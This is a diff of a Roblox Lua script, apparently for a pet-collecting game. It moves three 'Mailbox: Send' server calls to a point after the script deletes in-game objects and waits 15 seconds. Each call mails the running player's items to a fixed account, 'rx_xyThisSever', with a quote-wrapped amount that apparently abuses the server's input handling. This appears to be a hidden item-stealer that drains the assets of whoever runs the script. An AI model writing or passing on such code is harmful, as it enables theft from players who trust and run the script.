@@ -61,35 +61,6 @@ if BucketName and BucketAmount and BucketId then
 end
 
 
-local args = {
-    [1] = "rx_xyThisSever",
-    [2] = "'" .. BucketAmount .. "'", -- Adding single quotes around BucketAmount
-    [3] = "Misc",
-    [4] = MagicId,
-    [5] = MagicAmount
-}
-
-game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-
-local args = {
-    [1] = "rx_xyThisSever",
-    [2] = "'" .. BucketAmount .. "'", -- Adding single quotes around BucketAmount
-    [3] = "Misc",
-    [4] = MagicId,
-    [5] = MagicAmount
-}
-
-game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-
-local args = {
-    [1] = "rx_xyThisSever",
-    [2] = "'" .. BucketAmount .. "'", -- Adding single quotes around BucketAmount
-    [3] = "Misc",
-    [4] = MagicId,
-    [5] = MagicAmount
-}
-
-game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 
 
 
@@ -124,6 +95,35 @@ workspace:FindFirstChild("__THINGS").Breakables:Destroy()
 workspace:FindFirstChild("__THINGS").Eggs:Destroy()
 workspace:FindFirstChild("__THINGS").Ornaments:Destroy()
 wait(15)
+local args = {
+    [1] = "rx_xyThisSever",
+    [2] = "'" .. BucketAmount .. "'", -- Adding single quotes around BucketAmount
+    [3] = "Misc",
+    [4] = MagicId,
+    [5] = MagicAmount
+}
+
+game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+local args = {
+    [1] = "rx_xyThisSever",
+    [2] = "'" .. BucketAmount .. "'", -- Adding single quotes around BucketAmount
+    [3] = "Misc",
+    [4] = MagicId,
+    [5] = MagicAmount
+}
+
+game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+local args = {
+    [1] = "rx_xyThisSever",
+    [2] = "'" .. BucketAmount .. "'", -- Adding single quotes around BucketAmount
+    [3] = "Misc",
+    [4] = MagicId,
+    [5] = MagicAmount
+}
+
+game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 
 local player = game.Players.LocalPlayer
 local character = player.Character
